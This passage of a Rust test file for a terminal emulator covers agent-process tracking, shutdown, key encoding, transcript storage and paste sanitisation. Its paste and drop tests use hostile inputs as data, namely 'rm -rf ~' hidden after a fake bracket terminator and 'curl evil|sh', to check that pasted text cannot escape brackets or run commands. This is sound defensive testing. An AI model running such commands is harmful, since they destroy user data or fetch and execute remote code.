            .collect::<String>(),
        "hidden"
    );
}

#[test]
fn agent_process_edges_wake_even_when_the_activity_scalar_is_unchanged() {
    let (mut worker, events) = capture_worker();
    let wakes = Arc::new(AtomicUsize::new(0));
    let observed = Arc::clone(&wakes);
    assert!(
        worker
            .published
            .agent_observer
            .set(Arc::new(move || {
                observed.fetch_add(1, Ordering::AcqRel);
            }))
            .is_ok()
    );
    let mut process = AgentProcess {
        pid: 1,
        start: 2,
        provider: crate::agent::Provider::Claude,
        launch: worker.launch.clone(),
        recovery: worker.launch.clone(),
    };
    worker.adopt_agent_process(Some(process.clone()));
    worker.adopt_agent_process(Some(process.clone()));
    assert_eq!(wakes.load(Ordering::Acquire), 1);
    process.start += 1;
    worker.adopt_agent_process(Some(process.clone()));
    assert_eq!(wakes.load(Ordering::Acquire), 2);
    assert_eq!(
        *worker.published.agent_process.lock().unwrap(),
        Some(process)
    );
    assert_eq!(
        events
            .try_iter()
            .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(_)))
            .count(),
        1,
        "replacing Unknown with Unknown wakes discovery, not subscribers"
    );
    worker.published.set_agent_activity(None);
    worker.published.set_agent_activity(None);
    assert_eq!(
        events
            .try_iter()
            .filter(|event| matches!(event, TerminalEvent::AgentActivityChanged(None)))
            .count(),
        1,
        "owner timeout clears are pushed exactly once"
    );
    worker.set_conversation_title("Same conversation".into());
    worker.set_conversation_title("Same conversation".into());
    assert_eq!(
        events
            .try_iter()
            .filter(|event| matches!(event, TerminalEvent::ConversationTitleChanged(_)))
            .count(),
        1
    );
    worker.adopt_agent_process(None);
    assert_eq!(wakes.load(Ordering::Acquire), 3);
    assert!(worker.published.agent_process.lock().unwrap().is_none());
    worker.run();
}

#[test]
fn foreground_sampling_discovers_shell_exec_without_a_process_group_change() {
    let directory = tempdir().unwrap();
    let executable = directory.path().join("claude");
    symlink("/bin/sleep", &executable).unwrap();
    let (mut worker, _) = capture_worker_for(LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/sh".into(),
        arguments: vec!["-c".into(), "read line; exec \"$AGENT\" 10".into()],
        working_directory: directory.path().into(),
        environment: BTreeMap::from([("AGENT".into(), executable.to_str().unwrap().into())]),
    });
    worker.observe_foreground();
    let original_group = worker.foreground_group();
    assert!(original_group.is_some());
    assert!(worker.agent_process.is_none());
    worker.write_pty(b"start\n", "fixture input");
    let deadline = std::time::Instant::now() + Duration::from_secs(3);
    while worker.agent_process.is_none() {
        worker.observe_foreground();
        assert!(
            std::time::Instant::now() < deadline,
            "unchanged foreground group hid shell exec"
        );
        std::thread::sleep(Duration::from_millis(5));
    }
    assert_eq!(worker.foreground_group(), original_group);
    assert_eq!(
        worker.agent_process.as_ref().unwrap().provider,
        crate::agent::Provider::Claude
    );
    assert!(worker.published.agent_process.lock().unwrap().is_some());
    worker.run();
}

#[test]
fn foreground_observation_backs_off_and_slows_for_unwatched_terminals() {
    // A long-lived child keeps the foreground group stable for the whole
    // test, so every tick below takes its "nothing changed" path.
    let (mut worker, _) = capture_worker_for(LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/sleep".into(),
        arguments: vec!["10".into()],
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
    });
    worker.resume_foreground = worker.foreground_group();
    assert!(worker.agent_process.is_none());

    // With the same group and no agent to track, the interval stretches instead of descending /proc every 2s forever.
    worker.observe_foreground();
    assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 2);
    worker.observe_foreground();
    assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN * 4);
    assert_eq!(worker.resume_foreground, worker.foreground_group());

    // A terminal nobody is watching still re-walks a tracked agent, at the
    // slowest interval, so its saved identity stays current for recovery
    // even though the agent never leaves the foreground.
    worker.set_hidden();
    let launch = worker.launch.clone();
    worker.agent_process = Some(crate::model::agent_recovery::AgentProcess {
        pid: 1,
        start: 0,
        provider: crate::agent::Provider::Claude,
        launch: launch.clone(),
        recovery: launch,
    });
    worker.observe_foreground();
    assert!(
        worker.agent_process.is_none(),
        "the tracked agent was re-observed"
    );
    assert_eq!(worker.resume_foreground, worker.foreground_group());
    assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MAX);

    // Revealing it makes the next observation prompt again.
    worker.reveal();
    assert_eq!(worker.foreground_poll, FOREGROUND_POLL_MIN);
}

#[test]
fn shutdown_bounds_a_root_that_ignores_hangup_and_preserves_graceful_exit() {
    use std::io::Read as _;
    struct Cleanup<'a>(&'a holder::HeldChild);
    impl Drop for Cleanup<'_> {
        fn drop(&mut self) {
            let _ = self.0.force_kill();
        }
    }
    for (script, expected_code) in [
        ("trap '' HUP; printf ready; while :; do sleep 1; done", None),
        (
            "trap 'exit 3' HUP; printf ready; while :; do sleep 0.05; done",
            Some(3),
        ),
    ] {
        let mut command = portable_pty::CommandBuilder::new("/bin/sh");
        command.args(["-c", script]);
        let (sender, exits) = crossbeam_channel::bounded(1);
        let held = holder::spawn(
            command,
            portable_pty::PtySize {
                rows: 24,
                cols: 80,
                pixel_width: 0,
                pixel_height: 0,
            },
            sender,
        )
        .unwrap();
        let cleanup = Cleanup(&held.child);
        let mut reader = std::fs::File::from(held.master.duplicate().unwrap());
        let flags = unsafe { libc::fcntl(reader.as_raw_fd(), libc::F_GETFL) };
        assert!(flags >= 0);
        // This test owns the master and uses it only for readiness input.
        assert_eq!(
            unsafe { libc::fcntl(reader.as_raw_fd(), libc::F_SETFL, flags | libc::O_NONBLOCK) },
            0
        );
        let deadline = std::time::Instant::now() + Duration::from_secs(5);
        let mut ready = [0; 5];
        let mut received = 0;
        while received < ready.len() {
            let remaining = deadline.saturating_duration_since(std::time::Instant::now());
            assert!(
                !remaining.is_zero(),
                "held fixture did not print readiness before its deadline"
            );
            let mut target = libc::pollfd {
                fd: reader.as_raw_fd(),
                events: libc::POLLIN,
                revents: 0,
            };
            // One owned descriptor; retry an interrupted wait against the
            // same deadline rather than extending the readiness budget.
            let polled = unsafe {
                libc::poll(
                    &mut target,
                    1,
                    remaining.as_millis().min(i32::MAX as u128) as i32,
                )
            };
            if polled < 0
                && std::io::Error::last_os_error().kind() == std::io::ErrorKind::Interrupted
            {
                continue;
            }
            assert!(polled > 0, "held fixture readiness wait failed or expired");
            match reader.read(&mut ready[received..]) {
                Ok(0) => panic!("held fixture closed before readiness"),
                Ok(count) => received += count,
                Err(error)
                    if matches!(
                        error.kind(),
                        std::io::ErrorKind::WouldBlock | std::io::ErrorKind::Interrupted
                    ) => {}
                Err(error) => panic!("read held fixture readiness: {error}"),
            }
        }
        assert_eq!(&ready, b"ready");
        let root = RootIdentity::capture(held.child.pid(), None).unwrap();
        let started = std::time::Instant::now();
        let status = shutdown_child_exit(&held.child, Some(&root), &exits, false).unwrap();
        assert!(started.elapsed() < CHILD_SHUTDOWN_DEADLINE);
        match expected_code {
            Some(code) => assert_eq!(status.exit_code(), code),
            None => assert!(status.signal().is_some()),
        }
        assert!(!held.child.unreaped());
        drop(cleanup);
        drop(held);
    }
}

#[test]
fn shutdown_does_not_fabricate_completion_when_holder_reporting_fails() {
    let mut command = portable_pty::CommandBuilder::new("/bin/sh");
    command.args(["-c", "exit 0"]);
    let (sender, exits) = crossbeam_channel::bounded(1);
    let held = holder::spawn(
        command,
        portable_pty::PtySize {
            rows: 24,
            cols: 80,
            pixel_width: 0,
            pixel_height: 0,
        },
        sender,
    )
    .unwrap();
    let (sender, disconnected) = crossbeam_channel::bounded(1);
    drop(sender);
    assert!(
        matches!(shutdown_child_exit(&held.child, None, &disconnected, true), Err(message) if message == "child reaper closed")
    );
    assert!(matches!(
        child_exit_event(&mut false, Err("child reaper closed".into()), false),
        Some(TerminalEvent::Error { .. })
    ));
    let _ = exits.recv_timeout(CHILD_SHUTDOWN_DEADLINE);
}

#[test]
fn shutdown_bypasses_a_saturated_input_queue_and_coalesced_wake() {
    let (mut worker, events) = capture_worker();
    let expected = worker.current_size;
    let (commands, receiver) = command_channel(1);
    commands
        .send(Command::Resize(TerminalSize {
            columns: 100,
            rows: 40,
            ..expected
        }))
        .unwrap();
    worker.commands = receiver;
    let handle = TerminalHandle {
        inner: Arc::new(HandleInner {
            commands,
            events,
            published: Arc::clone(&worker.published),
            worker: joins::JoinOwner::empty(Arc::clone(&worker.published)),
        }),
    };
    assert!(handle.inner.commands.is_full());
    let _ = handle.inner.published.capture_tx.try_send(());
    handle.request_shutdown();
    worker.run();
    assert!(handle.is_completed());
    assert_eq!(handle.snapshot().columns, expected.columns);
    assert!(handle.shutdown().is_ok());
}

#[test]
fn shutdown_preserves_already_parsed_dirty_contents() {
    let (mut worker, _) = capture_worker();
    worker.publish_snapshot(true);
    worker.process_output(b"before shutdown".to_vec());
    let published = Arc::clone(&worker.published);
    let (commands, receiver) = command_channel(1);
    commands.send(Command::Shutdown).unwrap();
    worker.commands = receiver;
    worker.run();
    assert_eq!(
        published.snapshot.load().lines[0]
            .cells
            .iter()
            .take(15)
            .map(|cell| cell.text.as_str())
            .collect::<String>(),
        "before shutdown"
    );
}

#[test]
fn leader_exit_does_not_end_output_capture_or_redraw_credit() {
    let (mut worker, events) = capture_worker();
    let published = Arc::clone(&worker.published);
    worker.publish_snapshot(true);
    let mut exited = false;
    worker.handle_child_exit(&mut exited, Ok(ExitStatus::with_exit_code(0)));
    assert!(matches!(
        events.try_recv(),
        Ok(TerminalEvent::Exited { .. })
    ));
    worker.process_output(b"descendant".to_vec());
    worker.published.acknowledge(worker.generation);
    worker.capture_if_ready();
    assert_eq!(
        worker.published.snapshot.load().lines[0]
            .cells
            .iter()
            .take(10)
            .map(|cell| cell.text.as_str())
            .collect::<String>(),
        "descendant"
    );
    assert!(
        events
            .try_iter()
            .all(|event| !matches!(event, TerminalEvent::Completed { .. })),
        "root exit must not finalize a PTY still owned by descendants"
    );
    worker.run();
    assert!(
        events
            .try_iter()
            .any(|event| matches!(event, TerminalEvent::Completed { .. })),
        "worker teardown publishes the distinct final completion event"
    );
    assert!(
        published.completed.load(Ordering::Acquire),
        "observing final completion must also certify ended continuity"
    );
}

fn test_published(visible: bool, wakes: Arc<AtomicUsize>) -> PublishedState {
    PublishedState::new(
        visible,
        Arc::new(move |_| {
            wakes.fetch_add(1, Ordering::SeqCst);
        }),
    )
}

fn snapshot(generation: u64) -> Arc<RenderSnapshot> {
    Arc::new(RenderSnapshot {
        generation,
        ..RenderSnapshot::empty()
    })
}

fn key_input(
    action: KeyAction,
    key: TerminalKey,
    text: Option<&str>,
    unshifted_codepoint: Option<char>,
) -> KeyInput {
    KeyInput {
        action,
        key,
        modifiers: KeyModifiers::default(),
        text: text.map(str::to_owned),
        unshifted_codepoint,
    }
}

#[test]
fn a_paste_is_typed_input_until_the_child_asks_for_brackets() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    assert_eq!(
        encode_paste(&terminal, "one\r\ntwo\nthree\rfour", PasteOrigin::Clipboard).unwrap(),
        b"one\rtwo\rthree\rfour"
    );
    assert_eq!(
        encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
        b""
    );

    terminal.vt_write(b"\x1b[?2004h");
    assert_eq!(
        encode_paste(&terminal, "one\ntwo", PasteOrigin::Clipboard).unwrap(),
        b"\x1b[200~one\ntwo\x1b[201~"
    );
    // An empty paste is no paste, not an empty pair of brackets a child
    // would take for one.
    assert_eq!(
        encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
        b""
    );

    terminal.vt_write(b"\x1b[?2004l");
    assert_eq!(
        encode_paste(&terminal, "a\nb", PasteOrigin::Clipboard).unwrap(),
        b"a\rb"
    );
}

/// The mode is read where the child's output is parsed, so a paste that
/// follows the child enabling bracketed paste is framed, however recently
/// it asked.
#[test]
fn a_paste_reaches_the_child_framed_once_it_asks_for_brackets() {
    let recipe = LaunchRecipe {
        unset_environment: Default::default(),
        program: "/bin/sh".into(),
        arguments: vec![
            "-c".into(),
            "printf '\\033[?2004h\\033]2;ready\\007'; IFS= read -r line; \
                 printf '\\033]2;got:%s\\007' \"$(printf %s \"$line\" | od -An -tx1 | tr -d ' \\n')\"; \
                 sleep 5"
                .into(),
        ],
        working_directory: PathBuf::from("/"),
        environment: BTreeMap::new(),
    };
    let terminal = TerminalHandle::spawn(
        TerminalSession {
            owned_codex_listener: None,
            recovery_origin: None,
            predecessor: None,
            id: crate::model::TerminalId::new(),
            launch: recipe.clone(),
            transcript_path: None,
            resume_hint: None,
            continuity: crate::model::TerminalContinuity::RelaunchAvailable {
                recipe,
                last_exit: None,
            },
        },
        TerminalConfig::default(),
        |_| {},
    )
    .unwrap();
    let events = terminal.events();
    let title = |prefix: &str| {
        let deadline = std::time::Instant::now() + Duration::from_secs(10);
        loop {
            match events
                .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                .unwrap()
            {
                TerminalEvent::TitleChanged(title) if title.starts_with(prefix) => {
                    break title;
                }
                _ => {}
            }
        }
    };
    title("ready");
    terminal.paste("a b\n", PasteOrigin::Clipboard).unwrap();
    // The line the child read ends at the paste's own newline, which the
    // brackets kept from becoming a carriage return: ESC [ 2 0 0 ~ a SP b.
    assert_eq!(title("got:"), "got:1b5b3230307e612062");
    terminal.shutdown().unwrap();
}

#[test]
fn a_paste_cannot_end_its_own_brackets_or_signal_the_child() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    terminal.vt_write(b"\x1b[?2004h");
    assert_eq!(
        encode_paste(&terminal, "a\x1b[201~rm -rf ~\n", PasteOrigin::Clipboard).unwrap(),
        b"\x1b[200~a [201~rm -rf ~\n\x1b[201~"
    );
    assert_eq!(
        encode_paste(&terminal, "\0\x03\x04\x1a\x7f", PasteOrigin::Clipboard).unwrap(),
        b"\x1b[200~     \x1b[201~"
    );

    terminal.vt_write(b"\x1b[?2004l");
    assert_eq!(
        encode_paste(&terminal, "a\x1b[Ab\x03", PasteOrigin::Clipboard).unwrap(),
        b"a [Ab "
    );
}

/// Dragged text is the drag source's to choose, so it must not be able to
/// run a command in a child that reads a paste as typed input.
#[test]
fn a_drop_never_enters_a_line_or_presses_a_key() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    // Line breaks, readline's previous-history, kill and line-start keys,
    // a C1 CSI and DEL all arrive as spaces; TAB is text.
    assert_eq!(
        encode_paste(
            &terminal,
            "curl evil|sh\n\x10\r\x0b\x01x\r\n\u{9b}\x7f\ty",
            PasteOrigin::Drop
        )
        .unwrap(),
        b"curl evil|sh     x    \ty"
    );
    // A clipboard paste into the same child still enters its lines.
    assert_eq!(
        encode_paste(&terminal, "ls\n", PasteOrigin::Clipboard).unwrap(),
        b"ls\r"
    );

    // A child in bracketed paste mode reads the drop as one paste, which
    // it never runs by itself, so its line breaks are kept for it.
    terminal.vt_write(b"\x1b[?2004h");
    assert_eq!(
        encode_paste(&terminal, "a\nb\x1b[201~\n", PasteOrigin::Drop).unwrap(),
        b"\x1b[200~a\nb [201~\n\x1b[201~"
    );
}

#[test]
fn control_c_interrupts_whatever_keyboard_protocol_the_shell_left_behind() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    let mut encoder = KeyEncoder::new().unwrap();
    let mut control_c = |terminal: &Terminal<'_, '_>, text: &str| {
        let mut input = key_input(
            KeyAction::Press,
            TerminalKey::Character('c'),
            Some(text),
            Some('c'),
        );
        input.modifiers.control = true;
        encode_key_input(terminal, &mut encoder, input).unwrap()
    };

    // A child that never asked for the kitty protocol reads ETX, which the
    // line discipline turns into SIGINT.
    assert_eq!(control_c(&terminal, "c"), b"\x03");
    // fish pushes the protocol at its prompt...
    terminal.vt_write(b"\x1b[>5u");
    assert_eq!(control_c(&terminal, "c"), b"\x1b[99;5u");
    // ...and pops it before running a command, which reads ETX again.
    terminal.vt_write(b"\x1b[<u");
    assert_eq!(control_c(&terminal, "c"), b"\x03");
    // Handed the ETX itself as the key's text, the encoder has no key to
    // name and never produces one, which is why the widget hands over
    // what the key types without Ctrl.
    assert_eq!(control_c(&terminal, "\u{3}"), b"\x1b[3;5u");

    // The other control characters come from the key's own text as well,
    // and a chord with no control character of its own is named instead.
    let control = KeyModifiers {
        control: true,
        ..KeyModifiers::default()
    };
    for (key, text, unshifted, modifiers, expected) in [
        (' ', " ", ' ', control, &b"\x00"[..]),
        ('2', "2", '2', control, b"\x00"),
        ('/', "/", '/', control, b"\x1f"),
        (
            'c',
            "c",
            'c',
            KeyModifiers {
                alt: true,
                ..control
            },
            b"\x1b\x03",
        ),
        (
            'a',
            "A",
            'a',
            KeyModifiers {
                shift: true,
                ..control
            },
            b"\x1b[97;6u",
        ),
        ('[', "[", '[', control, b"\x1b[91;5u"),
    ] {
        let mut input = key_input(
            KeyAction::Press,
            TerminalKey::Character(key),
            Some(text),
            Some(unshifted),
        );
        input.modifiers = modifiers;
        assert_eq!(
            encode_key_input(&terminal, &mut encoder, input).unwrap(),
            expected,
            "{modifiers:?} {text:?}"
        );
    }

    // Keys that type control characters even without Ctrl are encoded
    // from the key alone.
    for (key, expected) in [
        (TerminalKey::Enter, &b"\r"[..]),
        (TerminalKey::Tab, b"\t"),
        (TerminalKey::Escape, b"\x1b"),
    ] {
        let input = key_input(KeyAction::Press, key, None, None);
        assert_eq!(
            encode_key_input(&terminal, &mut encoder, input).unwrap(),
            expected,
            "{key:?}"
        );
    }
}

#[test]
fn control_c_interrupts_on_a_non_latin_layout() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    let mut encoder = KeyEncoder::new().unwrap();
    // Ctrl+С on a Russian layout: the widget names the Latin key in its
    // place and hands over the layout's own text.
    let mut control = |terminal: &Terminal<'_, '_>, key, typed: &str| {
        let mut input = key_input(
            KeyAction::Press,
            TerminalKey::Character(key),
            Some(typed),
            typed.chars().next(),
        );
        input.modifiers.control = true;
        encode_key_input(terminal, &mut encoder, input).unwrap()
    };
    assert_eq!(control(&terminal, 'c', "с"), b"\x03");
    // The punctuation keys follow the US key in their place, into whatever
    // Ghostty makes of that key: Ctrl+Ъ is Ctrl+], and Ctrl+Х is Ctrl+[,
    // which Ghostty keeps as CSI u after fixterms rather than a bare ESC.
    assert_eq!(control(&terminal, ']', "ъ"), b"\x1d");
    assert_eq!(control(&terminal, '[', "х"), "\x1b[1093;5u".as_bytes());
    // A kitty child reads the layout's key, and its base-layout key when
    // it asks for alternates.
    terminal.vt_write(b"\x1b[>1u");
    assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089;5u".as_bytes());
    terminal.vt_write(b"\x1b[=5u");
    assert_eq!(control(&terminal, 'c', "с"), "\x1b[1089::99;5u".as_bytes());
}

#[test]
fn control_backspace_kills_words_only_in_legacy_encoding() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 100,
    })
    .unwrap();
    let mut encoder = KeyEncoder::new().unwrap();
    for action in [KeyAction::Press, KeyAction::Repeat, KeyAction::Release] {
        let mut input = key_input(action, TerminalKey::Backspace, None, None);
        input.modifiers.control = true;
        let bytes = encode_key_input(&terminal, &mut encoder, input).unwrap();
        assert_eq!(
            bytes,
            if action == KeyAction::Release {
                &b""[..]
            } else {
                &b"\x17"[..]
            }
        );
    }
    terminal.vt_write(b"\x1b[>1u");
    let mut input = key_input(KeyAction::Press, TerminalKey::Backspace, None, None);
    input.modifiers.control = true;
    assert_eq!(
        encode_key_input(&terminal, &mut encoder, input).unwrap(),
        b"\x1b[127;5u"
    );
}

#[test]
fn legacy_repeats_encode_once_as_ordinary_key_presses() {
    let terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 1_000,
    })
    .unwrap();
    let mut encoder = KeyEncoder::new().unwrap();
    let cases = [
        (TerminalKey::ArrowDown, None, None, &b"\x1b[B"[..]),
        (TerminalKey::Character('x'), Some("x"), Some('x'), &b"x"[..]),
        (TerminalKey::Backspace, None, None, &b"\x7f"[..]),
    ];

    for (key, text, unshifted_codepoint, expected) in cases {
        let press = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Press, key, text, unshifted_codepoint),
        )
        .unwrap();
        let repeat = encode_key_input(
            &terminal,
            &mut encoder,
            key_input(KeyAction::Repeat, key, text, unshifted_codepoint),
        )
        .unwrap();

        assert_eq!(press, expected, "unexpected press encoding for {key:?}");
        assert_eq!(repeat, expected, "unexpected repeat encoding for {key:?}");
    }
}

#[test]
fn event_reporting_protocol_preserves_repeat_semantics() {
    let mut terminal = Terminal::new(TerminalOptions {
        cols: 80,
        rows: 24,
        max_scrollback: 1_000,
    })
    .unwrap();
    terminal.vt_write(b"\x1b[>2u");
    assert!(
        terminal
            .kitty_keyboard_flags()
            .unwrap()
            .contains(key::KittyKeyFlags::REPORT_EVENTS)
    );
    let mut encoder = KeyEncoder::new().unwrap();

    let press = encode_key_input(
        &terminal,
        &mut encoder,
        key_input(KeyAction::Press, TerminalKey::ArrowDown, None, None),
    )
    .unwrap();
    let repeat = encode_key_input(
        &terminal,
        &mut encoder,
        key_input(KeyAction::Repeat, TerminalKey::ArrowDown, None, None),
    )
    .unwrap();

    assert_eq!(press, b"\x1b[1;1:1B");
    assert_eq!(repeat, b"\x1b[1;1:2B");
}

/// A generation the subscriber has not acknowledged must not silence the
/// next one. `capture_if_ready` is what holds this protocol to one wake
/// per drawn frame, so the announcement itself must not also wait for a
/// draw: an edge the callback dropped - a repaint broadcast while no
/// subscriber was visible - would otherwise freeze the terminal until
/// something unrelated repainted it.
#[test]
fn each_published_generation_is_announced_once_without_an_acknowledgement() {
    let wakes = Arc::new(AtomicUsize::new(0));
    let published = test_published(true, Arc::clone(&wakes));

    published.publish(snapshot(1));
    published.publish(snapshot(2));
    assert_eq!(wakes.load(Ordering::SeqCst), 2);

    // Acknowledging returns capture credit and announces nothing.
    published.acknowledge(2);
    assert_eq!(wakes.load(Ordering::SeqCst), 2);
    assert_eq!(published.capture_rx.try_recv(), Ok(()));
}

#[test]
fn hidden_publication_suppresses_visual_wakes() {
    let wakes = Arc::new(AtomicUsize::new(0));
    let published = test_published(false, Arc::clone(&wakes));

    published.publish(snapshot(1));

    assert_eq!(published.snapshot.load().generation, 1);
    assert_eq!(wakes.load(Ordering::SeqCst), 0);
}

#[test]
fn visibility_reveal_emits_latest_snapshot_once() {
    let wakes = Arc::new(AtomicUsize::new(0));
    let published = test_published(false, Arc::clone(&wakes));
    published.publish(snapshot(4));

    published.visible.store(true, Ordering::Release);
    published.request_wake(4);
    published.request_wake(4);

    assert_eq!(wakes.load(Ordering::SeqCst), 1);
}

#[test]
fn transcript_writer_privatizes_storage_and_preserves_append_behavior() {
    let root = tempdir().unwrap();
    let directory = root.path().join("transcripts");
    fs::create_dir(&directory).unwrap();
    fs::set_permissions(&directory, fs::Permissions::from_mode(0o755)).unwrap();
    let path = directory.join("terminal.log");
    fs::write(&path, b"before\n").unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o644)).unwrap();

    let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 1, 1 << 20).unwrap();
    writer.send(b"after\n".to_vec()).unwrap();
    writer.finish();

    assert_eq!(fs::read(&path).unwrap(), b"before\nafter\n");
    assert_eq!(
        fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
        0o700
    );
    assert_eq!(
        fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

#[test]
fn transcript_output_reaches_disk_without_an_orderly_finish() {
    let root = tempdir().unwrap();
    let directory = root.path().join("transcripts");
    fs::create_dir(&directory).unwrap();
    let path = directory.join("terminal.log");
    let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 8, 1 << 20).unwrap();
    writer.send(b"output before the crash\n".to_vec()).unwrap();
    let deadline = Instant::now() + Duration::from_secs(10);
    while fs::read(&path).unwrap() != b"output before the crash\n" {
        assert!(Instant::now() < deadline, "the output stayed in memory");
        thread::sleep(Duration::from_millis(5));
    }
    writer.finish();
}

#[test]
fn transcript_writer_creates_private_storage() {
    let root = tempdir().unwrap();
    let directory = root.path().join("new-transcripts");
    let path = directory.join("terminal.log");

    TranscriptWriter::start(path.clone(), TerminalId::new(), 1, 1 << 20)
        .unwrap()
        .finish();

    assert_eq!(
        fs::metadata(&directory).unwrap().permissions().mode() & 0o777,
        0o700
    );
    assert_eq!(
        fs::metadata(&path).unwrap().permissions().mode() & 0o777,
        0o600
    );
}

#[test]
fn transcript_writer_stops_at_size_cap_with_marker() {
    let root = tempdir().unwrap();
    let path = root.path().join("terminal.log");

    let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 64, 16).unwrap();
    writer.send(vec![b'x'; 64]).unwrap();
    writer.send(b"discarded\n".to_vec()).unwrap();
    writer.finish();

    let content = fs::read(&path).unwrap();
    assert!(
        content.ends_with(TRANSCRIPT_TRUNCATED_MARKER),
        "capped transcript should end with the truncation marker"
    );
    assert!(
        content.len() <= 16 + TRANSCRIPT_TRUNCATED_MARKER.len(),
        "capped transcript should not grow past the cap plus marker"
    );
}

#[test]
fn transcript_writer_caps_preexisting_oversized_file() {
    let root = tempdir().unwrap();
    let path = root.path().join("terminal.log");
    fs::write(&path, vec![b'y'; 32]).unwrap();

    let writer = TranscriptWriter::start(path.clone(), TerminalId::new(), 64, 16).unwrap();
    writer.send(b"new output\n".to_vec()).unwrap();
    writer.finish();

    let content = fs::read(&path).unwrap();
    assert_eq!(
        content,
        [vec![b'y'; 32], TRANSCRIPT_TRUNCATED_MARKER.to_vec()].concat(),
        "oversized transcript should keep existing bytes and record nothing more"
    );
}

#[test]
fn transcript_writer_rejects_file_and_directory_symlinks() {
    let root = tempdir().unwrap();
    let directory = root.path().join("transcripts");
    fs::create_dir(&directory).unwrap();
    let victim = directory.join("victim");
    fs::write(&victim, b"unchanged").unwrap();
    let linked_file = directory.join("linked.log");
    symlink(&victim, &linked_file).unwrap();

    assert!(TranscriptWriter::start(linked_file, TerminalId::new(), 1, 1 << 20).is_err());
    assert_eq!(fs::read(&victim).unwrap(), b"unchanged");

    let real_directory = root.path().join("real");
    fs::create_dir(&real_directory).unwrap();
    let linked_directory = root.path().join("linked-directory");
    symlink(&real_directory, &linked_directory).unwrap();
    assert!(
        TranscriptWriter::start(
            linked_directory.join("terminal.log"),
            TerminalId::new(),
            1,
            1 << 20
        )
        .is_err()
    );
}

#[test]
fn command_and_pty_channels_are_bounded() {
    let (commands, _receiver) = command_channel(1);
    commands.try_send(Command::Hide).unwrap();
    assert!(matches!(
        commands.try_send(Command::Reveal),
        Err(TrySendError::Full(_))
    ));

    let (pty, _receiver) = crossbeam_channel::bounded(1);
    pty.try_send(PtyMessage::Bytes(vec![1])).unwrap();
    assert!(matches!(
        pty.try_send(PtyMessage::Bytes(vec![2])),
        Err(TrySendError::Full(_))
    ));
}
#[test]
fn hidden_idle_wait_is_driven_by_commands_and_child_exit_channels() {
    let (command_tx, command_rx) = command_channel(1);
    let (_pty_tx, pty_rx) = crossbeam_channel::bounded(1);
    let (child_exit_tx, child_exit_rx) = crossbeam_channel::bounded(1);

    command_tx.send(Command::Hide).unwrap();
    assert!(matches!(
        wait_for_worker_event(
            &command_rx,
            &pty_rx,
            &child_exit_rx,
            &crossbeam_channel::never(),
            false,
            true,
            FOREGROUND_POLL_MIN,
            None,
        ),
        WorkerEvent::Command(Some(Command::Hide))
    ));

    child_exit_tx
        .send(Ok(ExitStatus::with_exit_code(7)))
        .unwrap();
    assert!(matches!(
        wait_for_worker_event(
            &command_rx,
            &pty_rx,
            &child_exit_rx,
            &crossbeam_channel::never(),
            false,
            true,
            FOREGROUND_POLL_MIN,
            None,
        ),
        WorkerEvent::ChildExit(Some(Ok(status))) if status.exit_code() == 7
    ));
}

#[test]
fn child_exit_is_published_exactly_once() {
    let deliveries = AtomicUsize::new(0);
    let (event_tx, event_rx) = crossbeam_channel::unbounded();
    let mut exited = false;

    for status in [7, 8] {
        if let Some(event) =
            child_exit_event(&mut exited, Ok(ExitStatus::with_exit_code(status)), false)
        {
            deliveries.fetch_add(1, Ordering::SeqCst);
            event_tx.send(event).unwrap();
        }
    }

    assert_eq!(deliveries.load(Ordering::SeqCst), 1);
    assert!(matches!(
        event_rx.try_recv(),
        Ok(TerminalEvent::Exited {
            exit_code: 7,
            signal: None,
            intentional: false,
        })
    ));
    assert!(event_rx.try_recv().is_err());
}

#[test]
fn close_receipt_suppresses_only_its_requested_kill_not_crashes_or_wait_errors() {
    use std::os::unix::process::ExitStatusExt;

    let killed = || ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGKILL));
    assert!(matches!(
        child_exit_event(&mut false, Ok(killed()), true),
        Some(TerminalEvent::Exited {
            intentional: true,
            signal: Some(_),
            ..
        })
    ));
    assert!(matches!(
        child_exit_event(&mut false, Ok(killed()), false),
        Some(TerminalEvent::Exited {
            intentional: false,
            ..
        })
    ));
    let crashed = ExitStatus::from(std::process::ExitStatus::from_raw(libc::SIGSEGV));
    assert!(matches!(
        child_exit_event(&mut false, Ok(crashed), true),
        Some(TerminalEvent::Exited {
            intentional: false,
            ..
        })
    ));
    assert!(matches!(
        child_exit_event(&mut false, Ok(ExitStatus::with_exit_code(7)), true),
        Some(TerminalEvent::Exited {
            exit_code: 7,
            intentional: false,
            ..
        })
    ));
    assert!(matches!(
        child_exit_event(&mut false, Err("reaper failed".into()), true),
        Some(TerminalEvent::Error {
            operation: "wait for child",
            ..
        })
    ));
}

fn env_recipe(environment: BTreeMap<String, String>) -> LaunchRecipe {
    LaunchRecipe {
